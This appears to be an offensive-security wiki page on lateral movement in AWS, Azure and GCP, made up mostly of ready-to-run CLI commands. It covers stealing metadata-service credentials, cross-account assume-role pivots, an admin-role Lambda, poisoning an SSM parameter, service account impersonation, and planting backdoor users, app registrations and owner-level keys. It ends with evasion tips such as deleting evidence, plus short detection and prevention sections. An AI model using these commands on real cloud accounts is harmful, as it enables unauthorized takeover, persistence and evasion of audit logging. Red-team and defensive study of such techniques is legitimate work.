#cloud #lateral-movement #aws #azure #gcp #persistence

Lateral movement in cloud is about pivoting between services, accounts, and resources using compromised identities. Cloud environments have multiple pivot points: IAM roles, service identities, cross-account access, and hybrid networking.

---

## Lateral Movement Vectors

### 1. Within-Account Service-to-Service

**AWS: EC2 → RDS (via IAM role)**
```
EC2 instance profile has RDS access
Compromise EC2 → query RDS database
```

**Attack:**
```bash
# From EC2
# Get temporary credentials
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>

# Configure AWS CLI
export AWS_ACCESS_KEY_ID="..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."

# Access RDS
aws rds describe-db-instances
aws rds describe-db-clusters
```

### 2. Cross-Account Lateral Movement

**AWS: Account A → Account B (via assume-role)**

**Setup (blue team configured this, attacker discovers it):**
```json
// Account B's AdminRole trust policy
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": {
      "AWS": "arn:aws:iam::111111111111:role/AppRole"  // Account A
    },
    "Action": "sts:AssumeRole"
  }]
}
```

**Attack:**
```bash
# In Account A, compromised AppRole has sts:AssumeRole permission
aws sts assume-role \
  --role-arn arn:aws:iam::222222222222:role/AdminRole \
  --role-session-name lateral-movement

# Returns temporary credentials for Account B
# Full Account B access compromised
```

### 3. Hybrid: On-Premises ↔ Cloud

**Network Pivot via Hybrid Identity**

```
On-Premises AD
    ↓
Azure AD / Entra ID (synchronized or federated)
    ↓
Azure Resources / O365
```

**Attack Chain:**
```
1. Compromise on-prem AD user
2. Use credentials in Entra ID (synced or federated)
3. Access cloud resources (Azure VMs, Storage, O365)
4. Pivot to other cloud identities
```

---

## AWS Lateral Movement Techniques

### PassRole + Lambda Invocation

**Scenario:** Limited user, but can create/invoke Lambda with admin role

```bash
# Step 1: Create malicious Lambda
aws lambda create-function \
  --function-name malicious \
  --runtime python3.9 \
  --role arn:aws:iam::123:role/AdminRole \
  --handler index.handler \
  --zip-file fileb://function.zip

# function.zip contains:
def handler(event, context):
    import boto3
    iam = boto3.client('iam')
    # Execute admin commands
    users = iam.list_users()
    return users

# Step 2: Invoke function (runs as AdminRole)
aws lambda invoke \
  --function-name malicious \
  --payload '{}' \
  output.json

# Step 3: Output contains admin-level data
cat output.json
```

### SSM Parameter Store Lateral Movement

**Scenario:** Compromise one service, another service reads secrets from SSM

```bash
# Service A: Can write to SSM Parameter Store
aws ssm put-parameter \
  --name /app/db-password \
  --value "attacker-backdoor-credential" \
  --type SecureString

# Service B: Reads same parameter (now compromised)
# Service B connects using backdoor credential
# Attacker pivots to Service B's data/systems
```

### Credential Chaining: Instance → Role → Cross-Account

```
EC2 Instance (compromised)
    ↓
Instance Profile (AppRole)
    ↓
AssumeRole to Account B AdminRole
    ↓
Access Account B resources
    ↓
Create new user/key in Account B for persistence
```

---

## Azure Lateral Movement Techniques

### Managed Identity Chaining

**Scenario:** App Service → Key Vault → SQL Database

```bash
# Step 1: App Service with Managed Identity
# Has access to Key Vault via RBAC role

# Step 2: Get managed identity token (from App Service)
TOKEN=$(curl -s "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2017-09-01&resource=https://vault.azure.net/" \
  -H "Metadata:true" | jq -r .access_token)

# Step 3: Retrieve SQL connection string from Key Vault
curl -s -H "Authorization: Bearer $TOKEN" \
  https://<vault-name>.vault.azure.net/secrets/sql-connection-string?api-version=2016-10-01

# Step 4: Connect to SQL Database using retrieved credentials
# Lateral movement complete: App Service → Key Vault → SQL Database
```

### Subscription Hop via Service Principal

**Scenario:** Compromise service principal with cross-subscription role

```bash
# Service principal has access to multiple subscriptions
az account list-subscriptions

# Enumerate other subscription
az account set --subscription <other-sub>

# Access resources in other subscription
az vm list
az storage account list
```

---

## GCP Lateral Movement Techniques

### Service Account Impersonation

**Scenario:** One service account can impersonate another (more privileged)

**Setup (blue team configured this):**
```bash
# Service Account A has roles/iam.serviceAccountTokenCreator on Service Account B
gcloud iam service-accounts add-iam-policy-binding \
  serviceB@project.iam.gserviceaccount.com \
  --member=serviceAccount:serviceA@project.iam.gserviceaccount.com \
  --role=roles/iam.serviceAccountTokenCreator
```

**Attack:**
```bash
# Compromise Service Account A
gcloud auth activate-service-account --key-file=serviceA.json

# Impersonate Service Account B (more privileged)
gcloud auth application-default print-access-token \
  --impersonate-service-account=serviceB@project.iam.gserviceaccount.com

# Now have Service Account B's permissions
# Can access its resources and permissions
```

### Cross-Project Access via Shared Resource

```
Project A (compromised)
    ↓
Shared service account key stored in Cloud Storage
    ↓
Key grants access to Project B
    ↓
Project B compromised
```

---

## Persistence After Lateral Movement

### AWS: Create Backdoor User

```bash
# After gaining admin access in Account B
aws iam create-user --user-name backdoor

# Create access key
aws iam create-access-key --user-name backdoor

# Attach admin policy
aws iam attach-user-policy \
  --user-name backdoor \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Save credentials for later access
# (outside of audit logs if possible)
```

### Azure: Create App Registration

```bash
# After gaining admin access
az ad app create --display-name backdoor

# Get app ID
APP_ID=$(az ad app list --query "[?displayName=='backdoor'].appId" -o tsv)

# Create credentials
az ad app credential reset --id $APP_ID --append

# Use credentials anytime to access tenant
# Credentials have same permissions as the app's role assignments
```

### GCP: Create Service Account Key

```bash
# After gaining admin access
gcloud iam service-accounts create backdoor \
  --display-name="Backdoor Service Account"

# Create key
gcloud iam service-accounts keys create key.json \
  --iam-account=backdoor@project.iam.gserviceaccount.com

# Assign admin role
gcloud projects add-iam-policy-binding <project> \
  --member=serviceAccount:backdoor@project.iam.gserviceaccount.com \
  --role=roles/owner

# Use key.json anytime for full access
```

---

## Discovery Tools

### AWS Enumeration
```bash
# Find all roles I can assume
aws iam list-roles | jq '.Roles[].AssumeRolePolicyDocument'

# Find cross-account trust relationships
aws iam list-roles | grep -i "arn:aws:iam::[0-9]"

# Enumerate Lambda functions (potential pivot points)
aws lambda list-functions

# Find RDS databases
aws rds describe-db-instances | jq '.DBInstances[].DBName'
```

### Azure Enumeration
```bash
# List subscriptions
az account list

# List resources across subscriptions
az resource list --subscription <sub-id>

# Find app registrations (service principals)
az ad app list --query "[].appId"

# Check managed identities
az identity list
```

### GCP Enumeration
```bash
# List projects
gcloud projects list

# List service accounts in project
gcloud iam service-accounts list

# List roles and bindings
gcloud projects get-iam-policy <project>

# Find cross-project access
gcloud organizations get-iam-policy <org-id>
```

---

## Detection & Evasion

### What Gets Logged
- **AWS CloudTrail:** Assume role, create user, attach policies, Lambda invocations
- **Azure Activity Log:** Role assignments, app registrations, managed identity token requests
- **GCP Audit Logs:** assumeServiceAccount, createServiceAccount, setIamPolicy

### Detection Signatures
- Cross-account assume-role calls
- Sudden new IAM identities (users, service accounts)
- Service accounts accessing unexpected resources
- Multiple failed assume-role attempts (before success)
- Unusual service-to-service communication patterns

### Evasion
- **Timing:** Execute during business hours or off-hours depending on baseline
- **Legitimacy:** Use cloud provider CLI (blends with normal usage)
- **Dormancy:** Create persistence but don't use immediately
- **Gradual:** Make small permission increases rather than sudden jumps
- **Mix:** Legitimate requests mixed with malicious ones
- **Cleanup:** Remove evidence (delete Lambda functions, remove policies)

---

## Prevention

### AWS: Least Privilege + Permission Boundaries
```json
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Action": "sts:AssumeRole",
    "Resource": "arn:aws:iam::*/role/AppRole",
    "Condition": {
      "StringEquals": {
        "sts:ExternalId": "unique-id"
      }
    }
  }]
}
```

### Azure: MFA for Service Principals
Require MFA for sensitive operations:
```bash
az ad app consent-required-status set --id <app-id> --consent-required true
```

### GCP: Workload Identity
Avoid service account keys entirely by using Workload Identity:
```bash
gcloud iam service-accounts add-iam-policy-binding \
  serviceAccount@project.iam.gserviceaccount.com \
  --member=serviceAccount:project.svc.id.goog[namespace/ksa] \
  --role=roles/iam.workloadIdentityUser
```

---

## Related Guides
- [[Cloud IAM & Identity]] — understanding role structure
- [[Cloud Metadata Service Attacks]] — obtaining initial credentials
- [[Cloud Privilege Escalation]] — escalating privileges
- [[Hybrid Networking Attacks]] — on-prem ↔ cloud pivoting
